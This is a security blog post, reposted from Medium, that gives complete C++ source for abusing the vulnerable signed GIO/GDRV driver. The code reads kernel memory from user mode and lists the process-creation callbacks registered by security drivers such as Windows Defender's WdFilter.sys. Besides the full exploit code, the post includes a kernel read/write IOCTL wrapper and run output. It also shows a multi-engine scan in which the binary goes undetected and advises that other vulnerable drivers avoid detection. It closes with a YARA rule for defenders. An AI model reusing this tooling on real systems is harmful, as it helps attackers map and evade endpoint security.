# https://core-jmp.org/2026/04/enumerating-windows-process-creation-callbacks/

[![Enumerating Windows Process Creation Callbacks](https://core-jmp.org/wp-content/uploads/2026/04/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-04-24-%D0%B2-15.23.30-300x300.png)](https://core-jmp.org/2026/04/enumerating-windows-process-creation-callbacks/)

April 24, 2026

by[oxfemale](https://core-jmp.org/author/oxfemale/ "View all posts by oxfemale")

withno comment

[BYOVD](https://core-jmp.org/security/byovd/ "View all posts in BYOVD") [cpp](https://core-jmp.org/security/cpp/ "View all posts in cpp") [EDR](https://core-jmp.org/security/edr/ "View all posts in EDR") [IOCTL](https://core-jmp.org/security/windows/ioctl/ "View all posts in IOCTL") [kernel](https://core-jmp.org/security/windows/kernel/ "View all posts in kernel") [windows](https://core-jmp.org/security/windows/ "View all posts in windows")

[Original text](https://medium.com/@s12deff/enumerating-windows-process-creation-callbacks-98e09153e2d7) by [S12 – 0x12Dark Development](https://medium.com/@s12deff?source=post_page---byline--98e09153e2d7---------------------------------------)

_The article explains how Windows process creation callbacks can be enumerated from user mode by abusing a vulnerable signed driver with a kernel memory read primitive. It focuses on `PspCreateProcessNotifyRoutine`, the kernel callback array used by security products, EDRs, and system drivers to receive notifications whenever a new process is created. The author outlines a five-step methodology: enumerate loaded kernel modules with `NtQuerySystemInformation(SystemModuleInformation)`, locate the `ntoskrnl.exe` base address, add the known offset of `PspCreateProcessNotifyRoutine`, use a BYOVD read primitive to read kernel memory, then walk the 64 callback slots and map each callback function address back to the driver that owns it. The implementation is shown in C++ and uses the GIO/GDRV vulnerable driver interface to read kernel memory via IOCTL. The PoC demonstrates output on Windows 11, identifying callbacks registered by drivers such as `WdFilter.sys`, `cng.sys`, `ksecdd.sys`, `tcpip.sys`, and others. The key idea is defensive and offensive visibility into which kernel drivers monitor process creation._

Welcome to this new post. Today we’re going to look at how Windows tracks which drivers get notified every time a new process is created, and how we can read that list from usermode

If you’ve ever wondered how EDRs know the moment a new process spawns, the answer lives in a kernel array called `PspCreateProcessNotifyRoutine`. Every security driver that wants to monitor process creation registers a callback there, and the kernel calls them all when a new process starts.

In this post we’ll walk through enumerating that array using a vulnerable driver to get read primitives into kernel memory. No kernel debugging, no custom drivet, just a BYOVD with kernel read primitive.

![](https://core-jmp.org/wp-content/uploads/2026/04/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-04-24-%D0%B2-15.23.30.png)

## Methodology

To enumerate all process creation callbacks registered in the Windows kernel, we need to follow these steps:

1. **List Loaded Kernel Drivers**: First, we need to get the base address of `ntoskrnl.exe` in memory. We use `NtQuerySystemInformation` with `SystemModuleInformation` to get a list of all loaded kernel modules and their base addresses. This is crucial because all the offsets we work with later are relative to this base.
2. **Locate the Callback Array**: Once we have the base address of `ntoskrnl.exe`, we add the known offset of `PspCreateProcessNotifyRoutine`to get the exact address of the array in kernel memory. This offset can be found using a kernel debugger like WinDbg
3. **Open a Read Primitive**: To read kernel memory from user-mode, we use a vulnerable driver (BYOVD) that exposes a read primitive via IOCTL. This lets us read arbitrary kernel memory addresses from a regular user-mode process
4. **Walk the Array**: With our read primitive, we iterate over the 64 slots of the array. For each non-null slot, we decode the pointer (the kernel stores it with some flag bits set) and perform a second read to dereference the `EX_CALLBACK` struct and get the actual callback function address
5. **Identify the Driver**: Finally, we compare each callback address against our list of loaded drivers to identify which driver registered each callback

```
ntoskrnl base + offset
        ↓
PspCreateProcessNotifyRoutine[0..63]
        ↓  (1st read + decode)
EX_CALLBACK struct
        ↓  (2nd read)
Callback function address  →  Driver name
```

## Implementation

Now, let’s look at how to translate that logic into C++ code. I have broken down the most important parts.

### Listing Kernel Drivers

We call `NtQuerySystemInformation` with class `11` (`SystemModuleInformation`) to get all loaded kernel modules. We store each driver’s name, base address and size in a vector, which we’ll use later to identify which driver owns each callback

```
std::vector<KernelDriver> GetSortedKernelDrivers() {
    auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    ULONG len = 0;
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, NULL, 0, &len);

    std::vector<BYTE> buffer(len);
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, buffer.data(), len, &len);

    auto mods = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.data());
    for (ULONG i = 0; i < mods->Count; i++) {
        KernelDriver drv;
        drv.BaseAddress = reinterpret_cast<uintptr_t>(mods->Modules[i].ImageBase);
        drv.Size = mods->Modules[i].ImageSize;
        drv.Name = std::string(reinterpret_cast<const char*>(mods->Modules[i].FullPathName)
                               + mods->Modules[i].OffsetToFileName);
        driverList.push_back(drv);
    }
}
```

### Getting the Array Address

We find `ntoskrnl.exe` in our driver list and add the hardcoded offset to get the exact kernel address of `PspCreateProcessNotifyRoutine`. The offset can be obtained with WinDbg:

```
lkd> ? nt!PspCreateProcessNotifyRoutine - nt
Evaluate expression: 15750464 = 00000000`00f05540
```

DWORD64 arrayBase = ntBase + 0xf05540;

### **Opening the Read Primitive**

We open a handle to the vulnerable driver (in this case GIO/GDRV) which exposes a kernel read primitive via IOCTL. This lets us read arbitrary kernel memory from usermode

```
HANDLE drv = CreateFileA("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE,
       0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
```

### Walking the Array

This is where everything comes together. We iterate the 64 slots, do two reads per entry, and match the result against our driver list

```
for (int i = 0; i < 64; i++) {
    DWORD64 callback = 0;
    ReadPrimitive(drv, &callback, (LPVOID)(uintptr_t)(arrayBase + (i * 8)), sizeof(DWORD64));

    if (callback == NULL) continue;

    // Decode the pointer, kernel stores it with flag bits set
    DWORD64 decoded = callback & ~((1ULL << 3) + 0x1);

    // Second read, dereference the EX_CALLBACK struct to get the actual function
    DWORD64 cbFunction = 0;
    ReadPrimitive(drv, &cbFunction, (LPVOID)(uintptr_t)decoded, sizeof(DWORD64));
    cbFunction = 0xffff000000000000ULL | (cbFunction >> 16); // fix byte order

    // Match against loaded drivers
    for (auto& kdrv : drivers) {
        if (cbFunction >= kdrv.BaseAddress && cbFunction < kdrv.BaseAddress + kdrv.Size) {
            cout << "[" << i << "] " << kdrv.Name << " -> 0x" << hex << cbFunction << endl;
            break;
        }
    }
}
```

Note that the byte order fix (`0xffff000000000000 | value >> 16`) is specific to how this particular driver returns data, yours may behave differently depending on which vulnerable driver you use.

## Code

**main.cpp**

```
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <vector>
#include <algorithm>
#include "DriverOps.h"

using namespace std;

typedef struct _SYSTEM_MODULE_ENTRY {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

struct KernelDriver {
    std::string Name;
    uintptr_t BaseAddress;
    uint32_t Size;
};

typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

struct offsets {
    ULONG64 PspCallProcessNotifyRoutine;
} g_offsets = {
    0xf05540, // (? fffff801`eb705540 - fffff801`ea800000) = (? ntstartaddress - fffff801`eb705540 nt!PspCreateProcessNotifyRoutine = <no type information>)
};

/*
    1- List all drivers
    2- Get nsoskrnl.exe base address
    3- Get PspCallProcessNotifyRoutine offset from ntoskrnl.exe
    4- Read current callback array
    5- Read the current function of each array callback element
*/

std::vector<KernelDriver> GetSortedKernelDrivers() {
    std::vector<KernelDriver> driverList;

    auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) return driverList;

    ULONG len = 0;
    const int SystemModuleInformation = 11;

    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &len);

    std::vector<BYTE> buffer(len);
    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
        buffer.data(),
        len,
        &len
    );

    if (status != 0) return driverList; // STATUS_SUCCESS = 0

    auto mods = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.data());

    for (ULONG i = 0; i < mods->Count; i++) {
        SYSTEM_MODULE_ENTRY& entry = mods->Modules[i];

        KernelDriver drv;
        drv.BaseAddress = reinterpret_cast<uintptr_t>(entry.ImageBase);
        drv.Size = entry.ImageSize;

        const char* nameStart = reinterpret_cast<const char*>(entry.FullPathName) + entry.OffsetToFileName;
        drv.Name = std::string(nameStart);

        driverList.push_back(drv);
    }

    std::sort(driverList.begin(), driverList.end(), [](const KernelDriver& a, const KernelDriver& b) {
        return a.BaseAddress < b.BaseAddress;
        });

    return driverList;
}

DWORD64 GetNtoskrnlBase(const std::vector<KernelDriver>& drivers) {
    if (drivers.empty()) {
        return 0;
    }

    for (const auto& drv : drivers) {
        std::string nameLower = drv.Name;
        std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::tolower);

        if (nameLower.find("ntoskrnl.exe") != std::string::npos ||
            nameLower.find("ntkrnl") != std::string::npos) {
            return (DWORD64)drv.BaseAddress;
        }
    }

    return 0;
}

BOOL EnableSeDebugPrivilege(){
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
        return FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
    {
        std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

DWORD64 FixByteOrder(DWORD64 value) {
    // Rotar 2 bytes (16 bits) a la derecha y rellenar 0xffff arriba
    return 0xffff000000000000ULL | (value >> 16);
}

int main(){
    BOOL setPriv = EnableSeDebugPrivilege();

    cout << "[+] Enumerating EDR Callbacks on Process Creation" << endl;
    vector<KernelDriver> drivers = GetSortedKernelDrivers();
    DWORD64 ntBase = GetNtoskrnlBase(drivers);
    DWORD64 arrayBase = ntBase + g_offsets.PspCallProcessNotifyRoutine;

    //cout << "[+] aaaaa  " << hex << drivers[21].BaseAddress << endl;
    HANDLE drv = openVulnDriver();
    cout << "[+] PspCreateProcessNotifyRoutine array at: " << hex << arrayBase << endl;


    for (int i = 0; i < 64; i++) {
        DWORD64 callback = 0;

        BOOL r = ReadPrimitive(drv, &callback, (LPVOID)(uintptr_t)(arrayBase + (i * 8)), sizeof(DWORD64));
        if (!r) {
            cout << "[!] Failed at slot " << i << endl;
            break;
        }

        if (callback == NULL) continue;

        cout << "[" << i << "] raw: 0x" << hex << callback << endl;

        DWORD64 decoded = callback & ~((1ULL << 3) + 0x1);
        cout << "[" << i << "] decoded: 0x" << hex << decoded << endl;

        DWORD64 cbFunction = 0;
        ReadPrimitive(drv, &cbFunction, (LPVOID)(uintptr_t)decoded, sizeof(DWORD64));
        cbFunction = FixByteOrder(cbFunction);
        cout << "[" << i << "] cbFunction: 0x" << hex << cbFunction << endl;

        for (auto& kdrv : drivers) {
            if (cbFunction >= kdrv.BaseAddress &&
                cbFunction < (kdrv.BaseAddress + kdrv.Size)) {
                cout << "    -> " << kdrv.Name << endl;
                break;
            }
        }
    }

}
```

**DriverOps.h**

```
#include <iostream>
#include <Windows.h>

// https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/

#define IOCTL_READWRITE_PRIMITIVE 0xC3502808

using namespace std;

typedef struct KernelWritePrimitive {
 LPVOID dst;
 LPVOID src;
 DWORD size;
} KernelWritePrimitive;

typedef struct KernelReadPrimitive {
 LPVOID dst;
 LPVOID src;
 DWORD size;
} KernelReadPrimitive;

BOOL WritePrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
 KernelWritePrimitive kwp;
 kwp.dst = dst;
 kwp.src = src;
 kwp.size = size;

 BYTE bufferReturned[48] = { 0 };
 DWORD returned = 0;
 BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&kwp, sizeof(kwp), (LPVOID)bufferReturned, sizeof(bufferReturned), &returned, nullptr);
 if (!result) {
  cout << "Failed to send write primitive. Error code: " << GetLastError() << endl;
  return FALSE;
 }
 cout << "Write primitive sent successfully. Bytes returned: " << returned << endl;
 return TRUE;
}

BOOL ReadPrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
 KernelReadPrimitive krp;
 krp.dst = dst;
 krp.src = src;
 krp.size = size;

 DWORD returned = 0;

 BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&krp, sizeof(krp), (LPVOID)dst, size, &returned, nullptr);
 if (!result) {
  cout << "Failed to send read primitive. Error code: " << GetLastError() << endl;
  return FALSE;
 }
 cout << "Read primitive sent successfully. Bytes returned: " << returned << endl;
 return TRUE;
}

HANDLE openVulnDriver() {
 HANDLE driver = CreateFileA("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
 if (!driver || driver == INVALID_HANDLE_VALUE)
 {
  cout << "Failed to open handle to driver. Error code: " << GetLastError() << endl;
  return NULL;
 }
 return driver;
}
```

## Proof of Concept

**Windows 11:**

We run the compiled code as **administrator:**

```
C:\Windows\System32>C:\Users\s12de\Documents\Github\byovds\FromRW_BYOVDto\SilencingPspCallProcessNotifyRoutine\x64\Debug\SilencingPspCallProcessNotifyRoutine.exe
[+] Enumerating EDR Callbacks on Process Creation
[+] PspCreateProcessNotifyRoutine array at: fffff8007f305540
Read primitive sent successfully. Bytes returned: 0
[0] raw: 0xffffc28f3966873f
[0] decoded: 0xffffc28f39668736
Read primitive sent successfully. Bytes returned: 0
[0] cbFunction: 0xfffff8000fd7a4a0
    -> cng.sys
Read primitive sent successfully. Bytes returned: 0
[1] raw: 0xffffc28f3b3fe76f
[1] decoded: 0xffffc28f3b3fe766
Read primitive sent successfully. Bytes returned: 0
[1] cbFunction: 0xfffff800117d63d0
    -> WdFilter.sys
Read primitive sent successfully. Bytes returned: 0
[2] raw: 0xffffc28f3b4fe9df
[2] decoded: 0xffffc28f3b4fe9d6
Read primitive sent successfully. Bytes returned: 0
[2] cbFunction: 0xfffff80010086e20
    -> ksecdd.sys
Read primitive sent successfully. Bytes returned: 0
[3] raw: 0xffffc28f3b4fe13f
[3] decoded: 0xffffc28f3b4fe136
Read primitive sent successfully. Bytes returned: 0
[3] cbFunction: 0xfffff800102746a0
    -> dxgkrnl.sys
Read primitive sent successfully. Bytes returned: 0
[4] raw: 0xffffc28f3b4ff6cf
[4] decoded: 0xffffc28f3b4ff6c6
Read primitive sent successfully. Bytes returned: 0
[4] cbFunction: 0xfffff80011fae140
    -> tcpip.sys
Read primitive sent successfully. Bytes returned: 0
[5] raw: 0xffffc28f3c1f722f
[5] decoded: 0xffffc28f3c1f7226
Read primitive sent successfully. Bytes returned: 0
[5] cbFunction: 0xfffff800125d0710
    -> iorate.sys
Read primitive sent successfully. Bytes returned: 0
[6] raw: 0xffffc28f3c1f89cf
[6] decoded: 0xffffc28f3c1f89c6
Read primitive sent successfully. Bytes returned: 0
[6] cbFunction: 0xfffff800108088c0
    -> CI.dll
Read primitive sent successfully. Bytes returned: 0
[7] raw: 0xffffc28f3c1f7e8f
[7] decoded: 0xffffc28f3c1f7e86
Read primitive sent successfully. Bytes returned: 0
[7] cbFunction: 0xfffff80013a861b0
    -> UCPD.sys
Read primitive sent successfully. Bytes returned: 0
[8] raw: 0xffffc28f439cb5df
[8] decoded: 0xffffc28f439cb5d6
Read primitive sent successfully. Bytes returned: 0
[8] cbFunction: 0xfffff80015f110d0
    -> peauth.sys
Read primitive sent successfully. Bytes returned: 0
[9] raw: 0xffffc28f42dc919f
[9] decoded: 0xffffc28f42dc9196
Read primitive sent successfully. Bytes returned: 0
[9] cbFunction: 0xfffff80015d99f70
    -> KslD.sys
Read primitive sent successfully. Bytes returned: 0
Read primitive sent successfully. Bytes returned: 0
Read primitive sent successfully. Bytes returned: 0
...
```

```
[0] cng.sys
[1] WdFilter.sys      ← Windows Defender
[2] ksecdd.sys
[3] dxgkrnl.sys
[4] tcpip.sys
[5] iorate.sys
[6] CI.dll
[7] UCPD.sys
[8] peauth.sys
[9] KslD.sys
```

## Detection

Now it’s time to see if the defenses are detecting this as a malicious threat.

Basically the summary is, if you use another vulnerable driver will work OK, with this driver you will be always caught.

### Kleenscan API

```
[*] Antivirus Scan Results:

  - alyac                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - amiti                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - arcabit              | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - avast                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - avg                  | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - avira                | Status: scanning   | Flag: Scanning results incomplete    | Updated: 2026-04-20
  - bullguard            | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - clamav               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - comodolinux          | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - crowdstrike          | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - drweb                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - emsisoft             | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - escan                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - fprot                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - fsecure              | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - gdata                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - ikarus               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - immunet              | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - kaspersky            | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - maxsecure            | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - mcafee               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - microsoftdefender    | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - nano                 | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - nod32                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - norman               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - secureageapex        | Status: ok         | Flag: Unknown                        | Updated: 2026-04-20
  - seqrite              | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - sophos               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - threatdown           | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - trendmicro           | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - vba32                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - virusfighter         | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - xvirus               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - zillya               | Status: ok         | Flag: Scanning results incomplete    | Updated: 2026-04-20
  - zonealarm            | Status: ok         | Flag: Undetected                     | Updated: 2026-04-20
  - zoner                | Status: ok         | Flag: Undetected
```

### Litterbox

Static Analysis:

![](https://core-jmp.org/wp-content/uploads/2026/04/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-04-24-%D0%B2-15.29.02.png)

### Windows Defender

Driver detected, but technique undetected.

### YARA

Here a YARA rule to detect this technique:

```
rule Detect_PspCreateProcessNotifyRoutine_Enumeration
{
    meta:
        author      = "0x12 Dark Development"
        description = "Detects binaries that attempt to enumerate PspCreateProcessNotifyRoutine kernel callbacks via BYOVD read primitives"
        date        = "2026-04-21"
        tags        = "kernel, byovd, edr-evasion, callback-enumeration"

    strings:
        // NtQuerySystemInformation with SystemModuleInformation (class 11)
        $ntqsi = "NtQuerySystemInformation" ascii wide

        // Vulnerable driver device names commonly used for read primitives
        $dev_gio     = "\\\\.\\GIO" ascii wide
        $dev_rtcore  = "\\\\.\\RTCore64" ascii wide
        $dev_physmem = "\\\\.\\PhysicalMemory" ascii wide
        $dev_gdrv    = "\\\\.\\GDrv" ascii wide

        // Kernel symbol strings sometimes referenced at runtime
        $sym1 = "PspCreateProcessNotifyRoutine" ascii wide
        $sym2 = "ntoskrnl.exe" ascii wide nocase

        // DeviceIoControl pattern used to send IOCTL read primitives
        $ioctl = "DeviceIoControl" ascii wide

        // Pointer decode pattern: callback & ~((1ULL << 3) + 0x1) = & ~0x9
        // Compiled usually to: and rax, FFFFFFFFFFFFFFF6
        $decode_ptr = { 48 83 E? F6 }

        // 0xffff000000000000 mask used to fix truncated kernel addresses
        $ffff_mask = { 00 00 00 00 00 00 FF FF }

        // Loop over 64 entries (0x40 = 64 in hex, common in compiled loops)
        $loop_64 = { 83 F? 40 }

    condition:
        uint16(0) == 0x5A4D and         // PE file
        $ntqsi and
        $ioctl and
        (1 of ($dev_*)) and
        $sym2 and
        2 of ($decode_ptr, $ffff_mask, $loop_64, $sym1)
}
```

## Conclusions

That’s it for this one. We’ve seen how Windows internally tracks process creation callbacks, and how easy it is to enumerate them from user-mode with nothing more than a read primitive and some pointer arithmetic.

The key takeaway here is that the technique itself is completely undetected, what gets flagged is the vulnerable driver, not your code. This is why driver selection matters so much in BYOVD scenarios.

### Share this:

- [Share on Facebook (Opens in new window)Facebook](https://core-jmp.org/2026/04/enumerating-windows-process-creation-callbacks/?share=facebook&nb=1)
- [Share on X (Opens in new window)X](https://core-jmp.org/2026/04/enumerating-windows-process-creation-callbacks/?share=x&nb=1)

### Like this:

LikeLoading...

Comments are closed.

Shopping Basket

%d